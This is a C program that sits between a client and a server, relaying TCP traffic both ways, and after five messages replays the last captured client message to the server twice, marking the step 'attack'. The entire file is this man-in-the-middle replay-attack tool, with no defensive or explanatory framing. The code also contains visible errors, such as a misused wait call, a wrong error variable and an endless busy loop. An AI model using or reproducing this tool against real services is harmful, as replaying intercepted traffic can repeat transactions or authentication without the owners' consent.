#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <netdb.h>
#include <time.h>

#define LISTEN_BACKLOG 50
#define BUFSIZE 4096


int main(int argc, char**argv)
{
  struct addrinfo hints, chints;
  struct addrinfo *result, *rp, *crp;
  int cfd, sfd, s, cs, csfd, s_bytes_in, c_bytes_in, k, attack;
  struct sockaddr_storage peer_addr1, peer_addr2;
  size_t  peer_addr_size;
  unsigned char *sbuf, *cbuf;
  // variables for select
  fd_set master;
  fd_set read_fds;
  int fdmax;
  FD_ZERO(&master);
  FD_ZERO(&read_fds);
  fdmax = 0;
  sbuf = malloc(BUFSIZE);

  if (argc != 4) {
    fprintf(stderr, "Usage: %s serverport clienthost clientport\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  // seed random
  srand(time(NULL));

  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_INET6;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;

  hints.ai_protocol = 0;
  hints.ai_canonname = NULL;
  hints.ai_addr = NULL;
  hints.ai_next = NULL;

  s = getaddrinfo(NULL, argv[1], &hints, &result);
  if (s != 0) {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
    exit(EXIT_FAILURE);
  }

  /* try list until successfully bind */
  int reuse_true = 1;
  int retval;

  for (rp = result; rp != NULL; rp = rp->ai_next) {
    sfd = socket(rp->ai_family, rp->ai_socktype,
        rp->ai_protocol);
    // allow port reuse
    retval = setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &reuse_true,
        sizeof(reuse_true));
    if (retval < 0) {
      perror("Setting socket option failed");
      exit(EXIT_FAILURE);
    }

    if (sfd == -1)
      continue;
    if (bind(sfd, rp->ai_addr, rp->ai_addrlen) == 0)
      break;        /* Success */

    close(sfd);
  }

  if (rp == NULL) {     /* no address succeeded */
    fprintf(stderr, "Could not bind\n");
    exit(EXIT_FAILURE);
  }

  freeaddrinfo(result);     /* binded don't need anymore */

  if (listen(sfd, LISTEN_BACKLOG) == -1) {
    fprintf(stderr, "Could not listen\n");
    exit(EXIT_FAILURE);
  }

  peer_addr_size = sizeof(struct sockaddr_storage);
  cfd = accept(sfd, (struct sockaddr *) &peer_addr1, &peer_addr_size);
  if (cfd == -1) {
    fprintf(stderr, "accept error\n");
    exit(EXIT_FAILURE);
  }
  // add server fd to select
  FD_SET(cfd, &master);
  fdmax = cfd;

  //
  // NOW CLIENT
  //
  memset(&chints, 0, sizeof(struct addrinfo));
  chints.ai_family = AF_UNSPEC;
  chints.ai_socktype = SOCK_STREAM;
  chints.ai_flags = 0;
  chints.ai_protocol = 0;

  cs = getaddrinfo(argv[2], argv[3], &chints, &result);
  if (cs != 0) {
    fprintf(stderr, "client getaddrinfo: %s\n", gai_strerror(s));
    exit(EXIT_FAILURE);
  }

  /* try until get good addr */
  for (crp= result; crp != NULL; crp = crp->ai_next) {
    csfd = socket(crp->ai_family, crp->ai_socktype,
        crp->ai_protocol);
    if (csfd == -1)
      continue;
    if (connect(csfd, crp->ai_addr, crp->ai_addrlen) != -1)
      break;

    close(csfd);
  }
  // add csfd to select
  FD_SET(csfd, &master);
  printf("fdmax: %d\n", fdmax);
  if (csfd > cfd)
    fdmax = csfd;
  printf("fdmax: %d\n", fdmax);

  if (crp == NULL) {
    fprintf(stderr, "Could not connect to server\n");
    exit(EXIT_FAILURE);
  }
  k = 0;
  attack = 0;
  while(1) {
    read_fds = master;
    if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
      perror("select failure");
      exit(4);
    }
    s_bytes_in = 0;
    c_bytes_in = 0;
    memset(sbuf, 0, BUFSIZE);
    if (FD_ISSET(cfd, &read_fds)) {
      s_bytes_in = recv(cfd, sbuf, BUFSIZE, 0);
      ++k;
      printf("received: %d bytes in from client\n", s_bytes_in);
      if (send(csfd, sbuf, s_bytes_in, 0)< 0)
        printf("send failure\n");
      if (k == 5) {
        attack = 1;
        break;
      }
    } else if (FD_ISSET(csfd, &read_fds)){
      ++k;
      s_bytes_in = recv(csfd, sbuf, BUFSIZE, 0);
      printf("bytes in from tunnel: %d\n", s_bytes_in);
      send (cfd, sbuf, s_bytes_in, 0);
    } else
      printf("NOPE\t");
    if (attack == 1)
      break;
  }
  printf("attack\n");
  send(csfd, sbuf, s_bytes_in,0);
  printf("and again\n");
  wait(1);
  send(csfd, sbuf, s_bytes_in,0);
  while(1);

  freeaddrinfo(result);
  free(sbuf);

  shutdown(cfd, SHUT_RDWR);

  return 0;
}
